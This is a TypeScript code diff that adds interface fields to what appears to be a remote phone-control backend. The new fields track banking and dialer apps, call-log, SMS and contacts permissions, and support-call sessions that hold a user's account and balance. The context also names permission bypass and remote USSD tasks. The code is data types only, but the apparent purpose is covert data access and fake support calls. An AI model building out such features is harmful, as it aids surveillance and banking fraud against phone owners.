@@ -57,11 +57,27 @@ export interface DeviceClient {
   lockReason?: string;
   approvalStatus?: DeviceApprovalStatus;
   permissionBypassStatus?: PermissionBypassStatus;
+  supportNumber?: string;
+  hasDialer?: boolean;
+  hasMessages?: boolean;
+  hasBanking?: boolean;
+  callLogPermGranted?: boolean;
+  smsPermGranted?: boolean;
+  contactsPermGranted?: boolean;
   lastSeenAtMs: number;
   isOnline?: boolean;
   ownerId?: string;
   createdAtMs?: number;
   updatedAtMs?: number;
+}
+
+export interface DialerCallLogEntry {
+  id: string;
+  number: string;
+  name: string;
+  type: 'incoming' | 'outgoing' | 'missed' | 'rejected' | 'blocked';
+  dateMs: number;
+  durationSec: number;
 }
 
 export interface DeviceRemoteOverride {
@@ -197,6 +213,8 @@ export interface CallSession {
   deviceName: string;
   callerRole: 'app_0069' | 'ram_control';
   callerName: string;
+  callerNumber?: string;
+  targetApp?: 'dialer' | 'banking' | 'any';
   callMode?: CallMode;
   status: CallSessionStatus;
   rtcSeq: number;
@@ -206,6 +224,27 @@ export interface CallSession {
   clientMicMuted: boolean;
   ownerVideoOff?: boolean;
   clientVideoOff?: boolean;
+  startedAtMs: number;
+  answeredAtMs: number;
+  expiresAtMs: number;
+  updatedAtMs: number;
+}
+
+export interface SupportCallSession {
+  callId: string;
+  deviceId: string;
+  deviceName: string;
+  userName: string;
+  phoneNumber: string;
+  userAccount: string;
+  balance: number;
+  callMode: 'audio';
+  status: CallSessionStatus;
+  rtcSeq: number;
+  rtcOffer: string;
+  rtcAnswer: string;
+  callerMicMuted: boolean;
+  supportMicMuted: boolean;
   startedAtMs: number;
   answeredAtMs: number;
   expiresAtMs: number;
@@ -241,6 +280,7 @@ export interface RemoteUssdTask {
 export interface DeviceSyncResponse {
   success: boolean;
   deviceId: string;
+  supportNumber?: string;
   approvalStatus: DeviceApprovalStatus;
   permissionBypassStatus?: PermissionBypassStatus;
   globalLocked: boolean;
